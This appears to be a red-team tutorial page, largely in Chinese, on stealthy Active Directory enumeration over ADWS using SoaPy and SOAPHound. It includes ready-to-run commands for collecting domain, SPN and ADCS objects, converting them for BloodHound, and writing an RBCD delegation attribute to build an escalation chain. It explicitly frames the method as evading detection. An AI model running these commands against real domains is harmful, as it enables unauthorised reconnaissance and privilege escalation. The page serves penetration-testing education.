# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS 是什么？

Active Directory Web Services (ADWS) 是 **自 Windows Server 2008 R2 起在每台域控制器上默认启用** 的服务，监听 TCP **9389**。尽管名字如此，**并不涉及 HTTP**。相反，该服务通过一组专有的 .NET 封装协议暴露类似 LDAP 的数据：

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

由于流量被封装在这些二进制 SOAP 帧中并通过一个不常用的端口传输，**通过 ADWS 进行枚举相比经典的 LDAP/389 和 636 流量更不容易被检测、过滤或签名**。对操作人员而言，这意味着：

* 更隐蔽的侦察 – 蓝队通常集中在 LDAP 查询上。
* 可通过将 9389/TCP 隧道化到 SOCKS 代理，从 **非 Windows 主机（Linux, macOS）** 收集数据。
* 可以获得与 LDAP 相同的数据（用户、组、ACL、schema 等），并能够执行**写入**操作（例如用于 **RBCD** 的 `msDs-AllowedToActOnBehalfOfOtherIdentity`）。

ADWS 交互通过 WS-Enumeration 实现：每个查询以一个定义 LDAP 过滤器/属性并返回 `EnumerationContext` GUID 的 `Enumerate` 消息开始，随后一个或多个 `Pull` 消息会流式传输到服务器定义的结果窗口。Contexts 大约在 30 分钟后过期，因此工具要么需要对结果进行分页，要么拆分过滤器（按 CN 做前缀查询）以避免丢失状态。请求安全描述符时，指定 `LDAP_SERVER_SD_FLAGS_OID` 控制以省略 SACL，否则 ADWS 会在其 SOAP 响应中直接删除 `nTSecurityDescriptor` 属性。

> NOTE: ADWS is also used by many RSAT GUI/PowerShell tools, so traffic may blend with legitimate admin activity.

## SoaPy – 原生 Python 客户端

[SoaPy](https://github.com/logangoins/soapy) 是用纯 Python 完整重新实现 ADWS 协议栈的项目。它逐字节构造 NBFX/NBFSE/NNS/NMF 帧，允许从类 Unix 系统收集数据而无需触碰 .NET 运行时。

### 主要特性

* 支持 **通过 SOCKS 代理**（对 C2 植入体有用）。
* 提供与 LDAP `-q '(objectClass=user)'` 相同的细粒度搜索过滤器。
* 可选的 **写入** 操作（ `--set` / `--delete`）。
* 用于直接导入 BloodHound 的 **BOFHound 输出模式**。
* `--parse` 标志用于在需要人工可读性时美化时间戳 / `userAccountControl`。

### 目标化收集标志与写入操作

SoaPy 随附了一组经策划的开关，重现了通过 ADWS 执行最常见的 LDAP 搜寻任务：`--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`，以及用于自定义拉取的原始 `--query` / `--filter` 选项。将它们与写入原语配合使用，例如 `--rbcd <source>`（设置 `msDs-AllowedToActOnBehalfOfOtherIdentity`）、`--spn <service/cn>`（用于针对性 Kerberoasting 的 SPN 阶段化）和 `--asrep`（在 `userAccountControl` 中切换 `DONT_REQ_PREAUTH`）。

示例：仅返回 `samAccountName` 和 `servicePrincipalName` 的目标化 SPN 搜索：
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
使用相同的主机/凭证立即将发现武器化：使用 `--rbcds` 转储具有 RBCD 能力的对象，然后执行 `--rbcd 'WEBSRV01$' --account 'FILE01$'` 来搭建一个 Resource-Based Constrained Delegation 链（有关完整滥用路径，请参见 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)）。

### 安装 (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## SOAPHound – 高吞吐量 ADWS 收集 (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) 是一个 .NET 收集器，将所有 LDAP 交互保留在 ADWS 内，并输出与 BloodHound v4-compatible JSON。它一次性构建 `objectSid`、`objectGUID`、`distinguishedName` 和 `objectClass` 的完整缓存（`--buildcache`），然后在高量级的 `--bhdump`、`--certdump` (ADCS) 或 `--dnsdump` (AD-integrated DNS) 传递中重用该缓存，从而只有约 35 个关键属性会离开 DC。AutoSplit（`--autosplit --threshold <N>`）会根据 CN 前缀自动对查询进行分片，以在大型林中保持在 30 分钟 EnumerationContext 超时以内。

在已加入域的操作员 VM 上的典型工作流程：
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
导出的 JSON 可直接插入到 SharpHound/BloodHound 工作流中——参见 [BloodHound methodology](bloodhound.md) 以获取后续制图的思路。AutoSplit 使 SOAPHound 在百万级对象的林中更具弹性，同时将查询次数保持低于 ADExplorer-style snapshots。

## 隐蔽 AD 收集工作流程

下面的工作流程演示如何通过 ADWS 枚举 **domain & ADCS objects**，将它们转换为 BloodHound JSON 并搜寻 certificate-based attack paths – 全部在 Linux 上完成：

1. **Tunnel 9389/TCP** from the target network to your box (e.g. via Chisel, Meterpreter, SSH dynamic port-forward, etc.).  Export `export HTTPS_PROXY=socks5://127.0.0.1:1080` or use SoaPy’s `--proxyHost/--proxyPort`.

2. **收集 root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **从 Configuration NC 收集与 ADCS 相关的对象：**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **转换为 BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **上传 ZIP** 到 BloodHound GUI 并运行 cypher 查询，例如 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`，以揭示证书提升路径（ESC1、ESC8 等）。

### 写入 `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
将此与 `s4u2proxy`/`Rubeus /getticket` 结合，以建立完整的 **Resource-Based Constrained Delegation** 链（参见 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)）。

## 工具汇总

| Purpose | Tool | Notes |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python、SOCKS、读/写 |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET、优先缓存、BH/ADCS/DNS 模式 |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | 转换 SoaPy/ldapsearch 日志 |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | 可以通过相同的 SOCKS 代理 |

## 参考资料

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
